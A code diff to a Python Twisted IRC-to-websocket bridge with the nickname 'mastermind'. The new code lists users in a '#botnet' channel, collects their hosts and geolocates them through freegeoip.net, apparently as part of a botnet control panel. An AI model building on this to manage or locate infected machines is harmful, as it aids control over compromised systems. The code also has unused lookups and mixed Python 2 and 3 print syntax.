@@ -1,27 +1,29 @@
 from twisted.words.protocols import irc
 from twisted.internet import reactor, protocol
 import decrypt
-
+import requests
+import json
 
 class ChatBridge(irc.IRCClient):
-
     nickname = "mastermind"
     debug = False
     websocket = None
 
+    HostList = []
+
     def connectionMade(self):
         irc.IRCClient.connectionMade(self)
         self.factory.websocket.connectToIRC()
-        self.factory.websocket.write_message({"type":"chat",\
-                "user":"NOTICE",\
-                "message":"YOU HAVE JOINED "+self.factory.channel})
+        self.factory.websocket.write_message({"type": "chat",
+                                              "user": "NOTICE",
+                                              "message": "YOU HAVE JOINED " + self.factory.channel})
 
     def connectionLost(self, reason):
         irc.IRCClient.connectionLost(self, reason)
 
     def joined(self, channel):
         pass
-    
+
     def setNick(self, nickname):
         irc.IRCClient.setNick(self, nickname)
         self.factory.nickname = nickname
@@ -35,9 +37,9 @@ class ChatBridge(irc.IRCClient):
         mesg = decrypt.decrypt(mesg)
         ##print mesg
         if self.factory.websocket:
-            self.factory.websocket.write_message({"type":"chat",\
-                    "user":user.split("!")[0],
-                    "message":mesg})
+            self.factory.websocket.write_message({"type": "chat",
+                                                  "user": user.split("!")[0],
+                                                  "message": mesg})
         else:
             print ("websocket not open")
 
@@ -48,23 +50,49 @@ class ChatBridge(irc.IRCClient):
         pass
 
     def userlist(self):
-        self.sendLine('NAMES %s' % self.factory.channel)
-    
+        baseUrl = "http://freegeoip.net/json/"
+        for host in self.HostList:
+            j1 = requests.get(baseUrl+host)
+            resp =  json.loads(j1.text)
+            resp["latitude"]
+            resp["longitude"]
+        self.factory.websocket.write_message({"type": "chat",
+                                              "user": "WHO",
+                                              "message": str(self.HostList)})
+
     def irc_RPL_NAMREPLY(self, *nargs):
-        print(nargs[1][3:])
+        self.factory.websocket.write_message({"type": "chat",
+                                              "user": "USERS",
+                                              "message": (nargs[1][3:])})
 
     def irc_RPL_ENDOFNAMES(self, *nargs):
-        print("NAMES COMPLETE")
+        self.who('#botnet')
+        self.factory.websocket.write_message({"type": "chat",
+                                              "user": "NOTICE",
+                                              "message": "RUNNING"})
 
     def irc_unknown(self, prefix, command, params):
         if self.debug:
             print ('UNKNOWN:', prefix, command, params)
 
+    def who(self, channel):
+        "List the users in 'channel', usage: client.who('#testroom')"
+        self.sendLine('WHO %s' % channel)
+
+    def irc_RPL_WHOREPLY(self, *nargs):
+        "Receive WHO reply from server"
+        self.HostList.append(nargs[1][3])
+        self.factory.websocket.write_message({"type": "chat",
+                                              "user": "WHO",
+                                              "message": str(nargs)})
+
+    def irc_RPL_ENDOFWHO(self, *nargs):
+        "Called when WHO output is complete"
+        print 'WHO COMPLETE'
 
 class ChatBridgeFactory(protocol.ClientFactory):
-
     bridge = None
-    
+
     def __init__(self, channel):
         self.channel = channel
 
@@ -83,4 +111,3 @@ class ChatBridgeFactory(protocol.ClientFactory):
     def clientConnectionFailed(self, connector, reason):
         print("connection failed:", reason)
         reactor.stop()
-
